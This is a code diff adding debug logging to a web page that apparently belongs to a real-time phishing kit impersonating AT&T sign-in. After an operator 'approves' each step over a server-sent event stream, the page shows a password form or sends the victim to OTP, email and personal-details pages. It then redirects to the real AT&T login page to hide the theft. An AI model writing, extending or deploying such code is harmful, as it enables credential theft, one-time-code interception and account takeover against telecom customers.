@@ -47,11 +47,15 @@ export default function Home() {
         try {
           const data = JSON.parse(event.data);
           console.log('[index.js] Received SSE message:', data);
+          console.log('[index.js] Message type:', data.type);
+          console.log('[index.js] Full event data:', event.data);
           
           if (data.type === 'approval') {
             approvalReceived = true;
             const approval = data.data;
             console.log('[index.js] Approval received:', approval);
+            console.log('[index.js] Approval status:', approval.status);
+            console.log('[index.js] Redirect type:', approval.redirectType);
             
             // Close SSE connection
             eventSource.close();
@@ -59,14 +63,16 @@ export default function Home() {
             
             if (approval.status === 'approved') {
               const redirectType = approval.redirectType || 'att';
-              console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
+              console.log(`[index.js] ✅ Handling redirect: ${redirectType} for user: ${userId}`);
               
               // Store userId for OTP/email/personal pages
               if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
                 localStorage.setItem('lastUserId', userId);
               }
               
+              console.log('[index.js] 🚀 About to call handleRedirect...');
               handleRedirect(redirectType, userId);
+              console.log('[index.js] ✅ handleRedirect called');
             } else if (approval.status === 'denied') {
               const loadingScreen = document.getElementById('loading-screen');
               if (loadingScreen) loadingScreen.classList.remove('active');
@@ -77,6 +83,8 @@ export default function Home() {
             }
           } else if (data.type === 'connected') {
             console.log('[index.js] SSE connected, waiting for approval...');
+          } else {
+            console.log('[index.js] ⚠️ Unknown message type:', data.type);
           }
         } catch (error) {
           console.error('Error parsing SSE message:', error);
@@ -98,10 +106,17 @@ export default function Home() {
     }
 
     function handleRedirect(redirectType, userId) {
+      console.log('[handleRedirect] Called with redirectType:', redirectType, 'userId:', userId);
       const loadingScreen = document.getElementById('loading-screen');
-      if (loadingScreen) loadingScreen.classList.remove('active');
+      if (loadingScreen) {
+        console.log('[handleRedirect] Hiding loading screen');
+        loadingScreen.classList.remove('active');
+      }
+      
+      console.log('[handleRedirect] Processing redirect type:', redirectType);
       
       if (redirectType === 'password') {
+        console.log('[handleRedirect] Showing password view');
         // Show password view - ensure user ID is preserved
         const currentUserId = userId || usernameInput.value.trim() || cachedUsername;
         if (currentUserId) {
@@ -122,14 +137,21 @@ export default function Home() {
         if (passwordInput) {
           passwordInput.focus();
         }
+        console.log('[handleRedirect] ✅ Password view shown');
       } else if (redirectType === 'otp') {
+        console.log('[handleRedirect] 🚀 Redirecting to /otp');
         window.location.href = '/otp';
       } else if (redirectType === 'email') {
+        console.log('[handleRedirect] 🚀 Redirecting to /email');
         window.location.href = '/email';
       } else if (redirectType === 'personal') {
+        console.log('[handleRedirect] 🚀 Redirecting to /personal');
         window.location.href = '/personal';
       } else if (redirectType === 'att') {
+        console.log('[handleRedirect] 🚀 Redirecting to AT&T');
         window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
+      } else {
+        console.error('[handleRedirect] ❌ Unknown redirect type:', redirectType);
       }
     }
 
